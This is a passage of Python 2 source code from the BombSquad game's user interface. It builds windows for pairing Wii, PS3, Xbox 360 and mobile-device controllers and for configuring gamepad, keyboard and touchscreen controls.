            parent=self._rootWidget, position=(35, height - 60),
            size=(140, 60),
            autoSelect=True, label=bs.Lstr(resource='cancelText'),
            scale=0.8, onActivateCall=self._dismiss)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        bsInternal._startListeningForWiiRemotes()
        self._wiimoteConnectCounter = 15

        global dismissWiiRemotesWindow
        dismissWiiRemotesWindow = bs.WeakCall(self._dismiss)

        t = bs.textWidget(
            parent=self._rootWidget, position=(15, height - 55),
            size=(width - 30, 30),
            text=bs.Lstr(resource=self._r + '.listeningText'),
            color=gTitleColor, maxWidth=320, hAlign="center", vAlign="center")
        t = bs.textWidget(
            parent=self._rootWidget, position=(15, height - 110),
            size=(width - 30, 30),
            scale=1.0, text=bs.Lstr(resource=self._r + '.pressText'),
            maxWidth=width * 0.9, color=(0.7, 0.9, 0.7, 1.0),
            hAlign="center", vAlign="center")
        t = bs.textWidget(
            parent=self._rootWidget, position=(15, height - 140),
            size=(width - 30, 30),
            color=(0.7, 0.9, 0.7, 1.0),
            scale=0.55, text=bs.Lstr(resource=self._r + '.pressText2'),
            maxWidth=width * 0.95, hAlign="center", vAlign="center")
        self._counterText = t = bs.textWidget(
            parent=self._rootWidget, position=(15, 23),
            size=(width - 30, 30),
            scale=1.2, text=("15"),
            hAlign="center", vAlign="top")

        for i in range(1, 15):
            bs.realTimer(1000*i, bs.WeakCall(self._decrement))

        bs.realTimer(15000, bs.WeakCall(self._dismiss))

    def _decrement(self):
        try:
            self._wiimoteConnectCounter -= 1
            bs.textWidget(edit=self._counterText, text=str(
                self._wiimoteConnectCounter))
        except Exception:
            pass

    def _dismiss(self):
        try:
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')
            bsInternal._stopListeningForWiiRemotes()
        except Exception:
            pass


class WiimoteLicenseWindow(Window):

    def __init__(self):
        self._r = 'wiimoteLicenseWindow'
        width = 750
        height = 550
        self._rootWidget = bs.containerWidget(
            size=(width, height), transition='inRight')
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(65, height - 50),
            size=(120, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(resource='backText'),
            buttonType='back', onActivateCall=self._close)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        t = bs.textWidget(
            parent=self._rootWidget, position=(0, height - 48),
            size=(width, 30),
            text=bs.Lstr(resource=self._r + '.titleText'),
            hAlign="center", color=gTitleColor, vAlign="center")
        licenseText = (
            'Copyright (c) 2007, DarwiinRemote Team\n'
            'All rights reserved.\n'
            '\n'
            '   Redistribution and use in source and binary forms, with or '
            'without modification,\n'
            '   are permitted provided that the following conditions are met:\n'
            '\n'
            '1. Redistributions of source code must retain the above copyright'
            ' notice, this\n'
            '     list of conditions and the following disclaimer.\n'
            '2. Redistributions in binary form must reproduce the above'
            ' copyright notice, this\n'
            '     list of conditions and the following disclaimer in the'
            ' documentation and/or other\n'
            '     materials provided with the distribution.\n'
            '3. Neither the name of this project nor the names of its'
            ' contributors may be used to\n'
            '     endorse or promote products derived from this software'
            ' without specific prior\n'
            '     written permission.\n'
            '\n'
            'THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND'
            ' CONTRIBUTORS "AS IS"\n'
            'AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT'
            ' LIMITED TO, THE\n'
            'IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR'
            ' PURPOSE\n'
            'ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR'
            ' CONTRIBUTORS BE\n'
            'LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY,'
            ' OR\n'
            'CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT'
            ' OF\n'
            ' SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;'
            ' OR BUSINESS\n'
            'INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,'
            ' WHETHER IN\n'
            'CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR'
            ' OTHERWISE)\n'
            'ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF'
            ' ADVISED OF THE\n'
            'POSSIBILITY OF SUCH DAMAGE.\n')
        licenseTextScale = 0.62
        t = bs.textWidget(
            parent=self._rootWidget, position=(100, height * 0.45),
            size=(0, 0),
            hAlign="left", vAlign="center", padding=4,
            color=(0.7, 0.9, 0.7, 1.0),
            scale=licenseTextScale, maxWidth=width * 0.9 - 100, maxHeight=height
            * 0.85, text=licenseText)

    def _close(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')


class ConnectPS3ControllersWindow(Window):

    def __init__(self):
        width = 760
        height = 330 if (bsInternal._isOuyaBuild()
                         or bsInternal._isRunningOnFireTV()) else 540
        spacing = 40
        self._r = 'ps3ControllersWindow'
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition='inRight', scale=1.35
            if gSmallUI else 1.3 if gMedUI else 1.0)

        b = bs.buttonWidget(
            parent=self._rootWidget, position=(37, height - 73),
            size=(135, 65),
            scale=0.85, label=bs.Lstr(resource='backText'),
            buttonType='back', autoSelect=True, onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, height - 46),
            size=(0, 0),
            maxWidth=410, text=bs.Lstr(
                resource=self._r + '.titleText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            color=gTitleColor, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        v = height - 90
        v -= spacing

        if bsInternal._isOuyaBuild() or bsInternal._isRunningOnFireTV():
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, height * 0.45),
                size=(0, 0),
                color=(0.7, 0.9, 0.7, 1.0),
                maxWidth=width * 0.95, maxHeight=height * 0.8, scale=1.0,
                text=bs.Lstr(resource=self._r + '.ouyaInstructionsText'),
                hAlign="center", vAlign="center")
        else:
            txts = bs.Lstr(
                resource=self._r+'.macInstructionsText'
            ).evaluate().split('\n\n\n')
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 29),
                size=(0, 0),
                color=(0.7, 0.9, 0.7, 1.0),
                maxWidth=width * 0.95, maxHeight=170, scale=1.0,
                text=txts[0].strip(),
                hAlign="center", vAlign="center")
            if len(txts) > 0:
                t2 = bs.textWidget(
                    parent=self._rootWidget, position=(width * 0.5, v - 280),
                    size=(0, 0),
                    color=(0.7, 0.9, 0.7, 1.0),
                    maxWidth=width * 0.95, maxHeight=170, scale=1.0,
                    text=txts[1].strip(),
                    hAlign="center", vAlign="center")

            bs.buttonWidget(
                parent=self._rootWidget, position=(225, v - 176),
                size=(300, 40),
                label=bs.Lstr(resource=self._r + '.pairingTutorialText'),
                autoSelect=True, onActivateCall=bs.Call(
                    bs.openURL,
                    'http://www.youtube.com/watch'
                    '?v=IlR_HxeOQpI&feature=related'))

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()


class Connect360ControllersWindow(Window):

    def __init__(self):
        self._r = 'xbox360ControllersWindow'
        width = 700
        height = 300 if (bsInternal._isOuyaBuild()
                         or bsInternal._isRunningOnFireTV()) else 485
        spacing = 40
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition='inRight', scale=1.4
            if gSmallUI else 1.4 if gMedUI else 1.0)

        b = bs.buttonWidget(
            parent=self._rootWidget, position=(35, height - 65),
            size=(120, 60),
            scale=0.84, label=bs.Lstr(resource='backText'),
            buttonType='back', autoSelect=True, onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, height - 42),
            size=(0, 0),
            scale=0.85, text=bs.Lstr(
                resource=self._r + '.titleText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            color=gTitleColor, maxWidth=400, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        v = height - 70
        v -= spacing

        if bsInternal._isOuyaBuild() or bsInternal._isRunningOnFireTV():
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, height * 0.47),
                size=(0, 0),
                color=(0.7, 0.9, 0.7, 1.0),
                maxWidth=width * 0.95, maxHeight=height * 0.75, scale=0.7,
                text=bs.Lstr(resource=self._r + '.ouyaInstructionsText'),
                hAlign="center", vAlign="center")
        else:
            t = bs.textWidget(parent=self._rootWidget,
                              position=(width * 0.5, v - 1),
                              size=(0, 0),
                              color=(0.7, 0.9, 0.7, 1.0),
                              maxWidth=width * 0.95, maxHeight=height * 0.22,
                              text=bs.Lstr(
                                  resource=self._r + '.macInstructionsText'),
                              scale=0.7, hAlign="center", vAlign="center")
            v -= 90
            bWidth = 300
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - bWidth) * 0.5, v - 10),
                size=(bWidth, 50),
                label=bs.Lstr(resource=self._r + '.getDriverText'),
                autoSelect=True, onActivateCall=bs.Call(
                    bs.openURL,
                    'https://github.com/360Controller/360Controller/releases'))
            bs.containerWidget(edit=self._rootWidget, startButton=b)
            v -= 60
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 85),
                size=(0, 0),
                color=(0.7, 0.9, 0.7, 1.0),
                maxWidth=width * 0.95, maxHeight=height * 0.46, scale=0.7,
                text=bs.Lstr(resource=self._r + '.macInstructions2Text'),
                hAlign="center", vAlign="center")

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()


class QRCodeWindow(PopupWindow):

    def __init__(self, originWidget, qrTex):

        position = originWidget.getScreenSpaceCenter()
        scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._transitioningOut = False
        self._width = 450
        self._height = 400
        bgColor = (0.5, 0.4, 0.6)
        PopupWindow.__init__(self, position=position,
                             size=(self._width, self._height),
                             scale=scale, bgColor=bgColor)
        env = bs.getEnvironment()
        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(50, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor,
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)
        bs.imageWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5 - 150, self._height * 0.5 - 150),
            size=(300, 300),
            texture=qrTex)

    def _onCancelPress(self):
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class ConnectMobileDevicesWindow(Window):

    def __init__(self):

        env = bs.getEnvironment()

        # this is different on ali..
        doAli = True if ( env['platform'] == 'android'
                          and env['subplatform'] == 'alibaba') else False

        self._r = 'connectMobileDevicesWindow'
        if doAli:
            width = 700
            height = 400
        else:
            width = 700
            height = 390
        spacing = 40
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition='inRight', scale=1.85
            if gSmallUI else 1.3 if gMedUI else 1.0, stackOffset=(-10, 0)
            if gSmallUI else(0, 0))
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(40, height - 67),
            size=(140, 65),
            scale=0.8, label=bs.Lstr(resource='backText'),
            buttonType='back', textScale=1.1, autoSelect=True,
            onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(width * 0.5, height - 42),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=370, color=gTitleColor, scale=0.8, hAlign="center",
            vAlign="center")

        if doAli:
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, height - 150),
                size=(0, 0),
                text=(
                    '\xe5\xa6\x82\xe9\x9c\x80\xe5\xb0\x86\xe6\x99\xba\xe8\x83'
                    '\xbd\xe6\x89\x8b\xe6\x9c\xba\xe6\x88\x96\xe5\xb9\xb3\xe6'
                    '\x9d\xbf\xe7\x94\xb5\xe8\x84\x91\xe7\x94\xa8\xe4\xbd\x9c'
                    '\xe6\x93\x8d\xe6\x8e\xa7\xe6\x89\x8b\xe6\x9f\x84\xef\xbc'
                    '\x8c\n'
                    '\xe8\xaf\xb7\xe5\xae\x89\xe8\xa3\x85\xe4\xbb\xa5\xe4\xb8'
                    '\x8b\xe5\xba\x94\xe7\x94\xa8\xe4\xb9\x8b\xe4\xb8\x80\xef'
                    '\xbc\x9a'),
                maxWidth=width * 0.9, color=gTitleColor, scale=1.0,
                hAlign="center", vAlign="center")

            t = bs.textWidget(
                parent=self._rootWidget, position=(190, 160),
                size=(0, 0),
                text='aliTV\xe7\x94\xa8\xe6\x88\xb7', maxWidth=width * 0.9,
                color=gTitleColor, scale=1.1, hAlign="center", vAlign="center")
            b = bs.buttonWidget(
                parent=self._rootWidget, position=(40, 50),
                size=(300, 70),
                scale=1.0, label=bsUtils._getRemoteAppName(),
                textScale=1.1, autoSelect=True)
            bs.buttonWidget(edit=b, onActivateCall=bs.Call(
                QRCodeWindow, b, bs.getTexture(
                    'aliControllerQR')))
            t = bs.textWidget(parent=self._rootWidget,
                              position=(width - 190, 160),
                              size=(0, 0),
                              text='iOS\xe7\x94\xa8\xe6\x88\xb7',
                              maxWidth=width * 0.9, color=gTitleColor,
                              scale=1.1, hAlign="center", vAlign="center")
            b = bs.buttonWidget(parent=self._rootWidget,
                                position=(width - 340, 50),
                                size=(300, 70),
                                scale=1.0, label=bs.Lstr(
                                    resource='remote_app.app_name'),
                                textScale=1.1, autoSelect=True)
            bs.buttonWidget(edit=b, onActivateCall=bs.Call(
                QRCodeWindow, b, bs.getTexture(
                    'aliBSRemoteIOSQR')))

        else:
            if gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall', size=(60, 60),
                    label=bs.getSpecialChar('back'))

            v = height - 70
            v -= spacing*1.2
            t = bs.textWidget(
                parent=self._rootWidget, position=(15, v - 26),
                size=(width - 30, 30),
                maxWidth=width * 0.95, color=(0.7, 0.9, 0.7, 1.0),
                scale=0.8, text=bs.Lstr(
                    resource=self._r + '.explanationText',
                    subs=[('${APP_NAME}', bs.Lstr(resource='titleText')),
                          ('${REMOTE_APP_NAME}', bsUtils._getRemoteAppName())]),
                maxHeight=100, hAlign="center", vAlign="center")
            v -= 90
            bWidth = 200

            # hmm the itms:// version doesnt bounce through safari but is kinda
            # apple-specific-ish
            sep = 230

            # new - just show link to remote page
            t = bs.textWidget(parent=self._rootWidget,
                              position=(width * 0.5, v + 5),
                              size=(0, 0),
                              color=(0.7, 0.9, 0.7, 1.0),
                              scale=1.4, text='bombsquadgame.com/remote',
                              maxWidth=width * 0.95, maxHeight=60,
                              hAlign="center", vAlign="center")
            v -= 30

            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 35),
                size=(0, 0),
                color=(0.7, 0.9, 0.7, 0.8),
                scale=0.65, text=bs.Lstr(
                    resource=self._r + '.bestResultsText'),
                maxWidth=width * 0.95, maxHeight=height * 0.19, hAlign="center",
                vAlign="center")

            bs.checkBoxWidget(
                parent=self._rootWidget, position=(width * 0.5 - 150, v - 116),
                size=(300, 30),
                maxWidth=300, scale=0.8, value=not bsInternal._getSetting(
                    'Enable Remote App'),
                autoSelect=True, text=bs.Lstr(
                    resource='disableRemoteAppConnectionsText'),
                onValueChangeCall=self._onCheckChanged)

    def _onCheckChanged(self, value):
        config = bs.getConfig()
        config['Enable Remote App'] = not value
        bs.writeConfig()
        bs.applySettings()

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()


class ConfigGamePadWindow(Window):

    def __init__(self):
        width = 480
        height = 170
        spacing = 40
        self._r = 'configGamepadSelectWindow'
        self._rootWidget = bs.containerWidget(
            scale=2.3 if gSmallUI else 1.5 if gMedUI else 1.0,
            size=(width, height),
            transition='inRight')
        b = bs.buttonWidget(
            parent=self._rootWidget, position=(20, height - 60),
            size=(130, 60),
            label=bs.Lstr(resource='backText'),
            buttonType='back', scale=0.8, onActivateCall=self._back)
        # lets not have anything selected by default; its misleading looking
        # for the controller getting configured..
        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=b, selectedChild=0)
        t = bs.textWidget(
            parent=self._rootWidget, position=(20, height - 50),
            size=(width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=250, color=gTitleColor, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        v = height - 60
        v -= spacing
        t = bs.textWidget(
            parent=self._rootWidget, position=(15, v),
            size=(width - 30, 30),
            scale=0.8, text=bs.Lstr(
                resource=self._r + '.pressAnyButtonText'),
            maxWidth=width * 0.95, color=gInfoTextColor, hAlign="center",
            vAlign="top")
        v -= spacing * 1.24
        ua = bs.getEnvironment()['userAgentString']
        if ('android' in ua and not bsInternal._isOuyaBuild()
                and not bsInternal._isRunningOnFireTV()):
            t = bs.textWidget(
                parent=self._rootWidget, position=(15, v),
                size=(width - 30, 30),
                scale=0.46, text=bs.Lstr(
                    resource=self._r + '.androidNoteText'),
                maxWidth=width * 0.95, color=(0.7, 0.9, 0.7, 0.5),
                hAlign="center", vAlign="top")

        bsInternal._captureGamePadInput(gamePadConfigureCallback)

    def _back(self):
        bsInternal._releaseGamePadInput()
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()


class ConfigTouchscreenWindow(Window):

    def __del__(self):
        # note - this happens in 'back' too just to get it going earlier..
        # (but we do it here too in case somehow the window is closed by
        # another means)
        bsInternal._setTouchscreenEditing(False)

    def __init__(self):

        self._width = 650
        self._height = 380
        self._spacing = 40
        self._r = 'configTouchscreenWindow'

        bsInternal._setTouchscreenEditing(True)

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition='inRight', scale=1.9
            if gSmallUI else 1.55 if gMedUI else 1.2)

        b = bs.buttonWidget(parent=self._rootWidget,
                            position=(55, self._height - 60),
                            size=(120, 60),
                            label=bs.Lstr(resource='backText'),
                            buttonType='back', scale=0.8,
                            onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget, position=(25, self._height - 50),
            size=(self._width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, maxWidth=280, hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        self._scrollWidth = self._width - 100
        self._scrollHeight = self._height - 110
        self._subWidth = self._scrollWidth-20
        self._subHeight = 360

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            position=((self._width - self._scrollWidth) * 0.5,
                      self._height - 65 - self._scrollHeight),
            size=(self._scrollWidth, self._scrollHeight))
        self._subContainer = c = bs.containerWidget(
            parent=self._scrollWidget, size=(self._subWidth, self._subHeight),
            background=False)
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)
        bs.containerWidget(
            edit=self._subContainer, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        self._buildGui()

    def _buildGui(self):

        # clear anything already there
        children = self._subContainer.getChildren()
        for c in children:
            c.delete()

        h = 30
        v = self._subHeight - 85

        cl = (0.8, 0.8, 0.8, 1.0)
        cl2 = (0.8, 0.8, 0.8)

        bs.textWidget(
            parent=self._subContainer, position=(-10, v + 43),
            size=(self._subWidth, 25),
            text=bs.Lstr(resource=self._r + '.swipeInfoText'),
            flatness=1.0, color=(0, 0.9, 0.1, 0.7),
            maxWidth=self._subWidth * 0.9, scale=0.55, hAlign="center",
            vAlign="center")

        try:
            curVal = bs.getConfig()['Touch Movement Control Type']
        except Exception:
            curVal = 'swipe'
        bs.textWidget(
            parent=self._subContainer, position=(h, v - 2),
            size=(0, 30),
            text=bs.Lstr(resource=self._r + '.movementText'),
            maxWidth=190, color=cl, vAlign='center')
        c1 = bs.checkBoxWidget(
            parent=self._subContainer, position=(h + 220, v),
            size=(170, 30),
            text=bs.Lstr(resource=self._r + '.joystickText'),
            maxWidth=100, textColor=cl2, scale=0.9)
        c2 = bs.checkBoxWidget(
            parent=self._subContainer, position=(h + 357, v),
            size=(170, 30),
            text=bs.Lstr(resource=self._r + '.swipeText'),
            maxWidth=100, textColor=cl2, value=0, scale=0.9)
        _makeRadioGroup(
            (c1, c2),
            ('joystick', 'swipe'),
            curVal, self._movementChanged)

        v -= 50
        configTextBox(
            parent=self._subContainer, position=(h, v),
            xOffset=65, name="Touch Controls Scale Movement",
            displayName=bs.Lstr(
                resource=self._r + '.movementControlScaleText'),
            type="float", changeSound=False, minVal=0.1, maxVal=4.0,
            increment=0.1)
        v -= 50

        try:
            curVal = bs.getConfig()['Touch Action Control Type']
        except Exception:
            curVal = 'buttons'
        bs.textWidget(
            parent=self._subContainer, position=(h, v - 2),
            size=(0, 30),
            text=bs.Lstr(resource=self._r + '.actionsText'),
            maxWidth=190, color=cl, vAlign='center')
        c1 = bs.checkBoxWidget(
            parent=self._subContainer, position=(h + 220, v),
            size=(170, 30),
            text=bs.Lstr(resource=self._r + '.buttonsText'),
            maxWidth=100, textColor=cl2, scale=0.9)
        c2 = bs.checkBoxWidget(
            parent=self._subContainer, position=(h + 357, v),
            size=(170, 30),
            text=bs.Lstr(resource=self._r + '.swipeText'),
            maxWidth=100, textColor=cl2, scale=0.9)
        _makeRadioGroup(
            (c1, c2),
            ('buttons', 'swipe'),
            curVal, self._actionsChanged)

        v -= 50
        configTextBox(
            parent=self._subContainer, position=(h, v),
            xOffset=65, name="Touch Controls Scale Actions",
            displayName=bs.Lstr(
                resource=self._r + '.actionControlScaleText'),
            type="float", changeSound=False, minVal=0.1, maxVal=4.0,
            increment=0.1)

        v -= 50
        configCheckBox(
            parent=self._subContainer, position=(h, v),
            size=(400, 30),
            maxWidth=400, name="Touch Controls Swipe Hidden",
            displayName=bs.Lstr(
                resource=self._r + '.swipeControlsHiddenText'))

        v -= 65

        b = bs.buttonWidget(
            parent=self._subContainer, position=(self._subWidth * 0.5 - 70, v),
            size=(170, 60),
            label=bs.Lstr(resource=self._r + '.resetText'),
            scale=0.75, onActivateCall=self._reset)

        t = bs.textWidget(
            parent=self._rootWidget, position=(self._width * 0.5, 38),
            size=(0, 0),
            hAlign='center', text=bs.Lstr(
                resource=self._r + '.dragControlsText'),
            maxWidth=self._width * 0.8, scale=0.65, color=(1, 1, 1, 0.4))

    def _actionsChanged(self, v):
        bs.getConfig()['Touch Action Control Type'] = v
        bs.writeConfig()
        bs.applySettings()

    def _movementChanged(self, v):
        bs.getConfig()['Touch Movement Control Type'] = v
        bs.writeConfig()
        bs.applySettings()

    def _reset(self):
        bsConfig = bs.getConfig()
        prefs = ['Touch Movement Control Type',
                 'Touch Action Control Type',
                 'Touch Controls Scale',
                 'Touch Controls Scale Movement',
                 'Touch Controls Scale Actions',
                 'Touch Controls Swipe Hidden',
                 'Touch DPad X',
                 'Touch DPad Y',
                 'Touch Buttons X',
                 'Touch Buttons Y']
        for p in prefs:
            if p in bsConfig:
                del(bsConfig[p])

        bs.writeConfig()
        bs.applySettings()

        bs.realTimer(0, self._buildGui)

    def _back(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = ControllersWindow(
            transition='inLeft').getRootWidget()
        bsInternal._setTouchscreenEditing(False)


def gamePadConfigureCallback(event):

    # ignore all but button-presses
    if event['type'] not in ['BUTTONDOWN', 'HATMOTION']:
        return

    bsInternal._releaseGamePadInput()

    try:
        bs.containerWidget(
            edit=uiGlobals['mainMenuWindow'],
            transition='outLeft')
    except Exception:
        bs.printException("error transitioning out mainMenuWindow")
    bs.playSound(bs.getSound('activateBeep'))
    bs.playSound(bs.getSound('swish'))
    if event['inputDevice']._getAllowsConfiguring():
        uiGlobals['mainMenuWindow'] = GamePadConfigWindow(
            event["inputDevice"]).getRootWidget()
    else:
        width = 700
        height = 200
        buttonWidth = 100
        uiGlobals['mainMenuWindow'] = d = bs.containerWidget(
            scale=1.7 if gSmallUI else 1.4 if gMedUI else 1.0,
            size=(width, height),
            transition='inRight')
        deviceName = event['inputDevice'].getName()
        if deviceName == 'iDevice':
            msg = bs.Lstr(resource='bsRemoteConfigureInAppText', subs=[
                          ('${REMOTE_APP_NAME}', bsUtils._getRemoteAppName())])
        else:
            msg = bs.Lstr(resource='cantConfigureDeviceText',
                          subs=[('${DEVICE}', deviceName)])
        t = bs.textWidget(
            parent=d, position=(0, height - 80),
            size=(width, 25),
            text=msg, scale=0.8, hAlign="center", vAlign="top")

        def _ok():
            bs.containerWidget(edit=d, transition='outRight')
            uiGlobals['mainMenuWindow'] = ControllersWindow(
                transition='inLeft').getRootWidget()
        b = bs.buttonWidget(
            parent=d, position=((width - buttonWidth) / 2, 20),
            size=(buttonWidth, 60),
            label=bs.Lstr(resource='okText'),
            onActivateCall=_ok)


class AwaitGamePadInputWindow(Window):

    def __init__(self, gamePad, button, callback, message=None, message2=None):

        if message is None:
            print 'AwaitGamePadInputWindow message is None!'
            message = 'Press any button...'  # shouldnt get here

        self._callback = callback
        self._input = gamePad
        self._captureButton = button

        width = 400
        height = 150
        self._rootWidget = bs.containerWidget(
            scale=2.0 if gSmallUI else 1.9 if gMedUI else 1.0,
            size=(width, height),
            transition='inScale')
        t = bs.textWidget(
            parent=self._rootWidget,
            position=(0, (height - 60) if message2 is None else(height - 50)),
            size=(width, 25),
            text=message, maxWidth=width * 0.9, hAlign="center",
            vAlign="center")
        if message2 is not None:
            t = bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, height - 60),
                size=(0, 0),
                text=message2, maxWidth=width * 0.9, scale=0.47,
                color=(0.7, 1.0, 0.7, 0.6),
                hAlign="center", vAlign="center")
        self._counter = 5
        self._countDownText = bs.textWidget(
            parent=self._rootWidget,
            hAlign='center',
            position=(0, height - 110),
            size=(width, 25),
            color=(1, 1, 1, 0.3),
            text=str(self._counter))
        self._decrementTimer = bs.Timer(
            1000, bs.Call(self._decrement),
            repeat=True, timeType='real')
        bsInternal._captureGamePadInput(bs.WeakCall(self._eventCallback))

    def __del__(self):
        pass

    def die(self):
        # this strong-refs us; killing it allow us to die now
        self._decrementTimer = None
        bsInternal._releaseGamePadInput()
        if self._rootWidget.exists():
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def _eventCallback(self, event):
        match = (event["inputDevice"] == self._input)

        # update - we now allow *any* input device of this type
        try:
            if event['inputDevice'].getName() == self._input.getName():
                match = True
        except Exception as e:
            # seems somewhat common for devices to disappear during this;
            # report any *other* errors..
            if 'Nonexistant input device' not in str(e):
                bs.printException(
                    'AwaitGamePadInputWindow: error comparing input devices')

        if match:
            self._callback(self._captureButton, event, self)

    def _decrement(self):
        self._counter -= 1
        if (self._counter >= 1):
            if self._countDownText.exists():
                bs.textWidget(edit=self._countDownText, text=str(self._counter))
        else:
            bs.playSound(bs.getSound('error'))
            self.die()


class AwaitKeyboardInputWindow(Window):

    def __init__(self, button, ui, settings):

        self._captureButton = button
        self._captureKeyUI = ui
        self._settings = settings

        width = 400
        height = 150
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition='inRight', scale=2.0
            if gSmallUI else 1.5 if gMedUI else 1.0)
        t = bs.textWidget(
            parent=self._rootWidget, position=(0, height - 60),
            size=(width, 25),
            text=bs.Lstr(resource='pressAnyKeyText'),
            hAlign="center", vAlign="top")

        self._counter = 5
        self._countDownText = bs.textWidget(
            parent=self._rootWidget, hAlign='center', position=(0, height - 110),
            size=(width, 25),
            color=(1, 1, 1, 0.3),
            text=str(self._counter))
        self._decrementTimer = bs.Timer(
            1000, bs.Call(self._decrement),
            repeat=True, timeType='real')
        bsInternal._captureKeyboardInput(bs.WeakCall(self._buttonCallback))

    def __del__(self):
        bsInternal._releaseKeyboardInput()

    def _die(self):
        # this strong-refs us; killing it allow us to die now
        self._decrementTimer = None
        if self._rootWidget.exists():
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _buttonCallback(self, event):
        self._settings[self._captureButton] = event["button"]
        if event['type'] == 'BUTTONDOWN':
            t = event['inputDevice'].getButtonName(event["button"])
            bs.textWidget(edit=self._captureKeyUI, text=t)
            bs.playSound(bs.getSound('gunCocking'))
            self._die()

    def _decrement(self):
        self._counter -= 1
        if (self._counter >= 1):
            bs.textWidget(edit=self._countDownText, text=str(self._counter))
        else:
            self._die()

# given an input-device and button name, returns the currently configured
# button ID


def getControllerValue(c, button, exceptionOnUnknown=False):

    name = c.getName()
    uniqueID = c.getUniqueIdentifier()
    env = bs.getEnvironment()
    ua = env['userAgentString']
    platform = env['platform']
    subplatform = env['subplatform']
    bsConfig = bs.getConfig()

    if (bsConfig.has_key("Controllers")):
        jsconfig = bsConfig["Controllers"]
        if (jsconfig.has_key(name)):
            src = None
            if (jsconfig[name].has_key(uniqueID)):
                src = jsconfig[name][uniqueID]
            elif (jsconfig[name].has_key("default")):
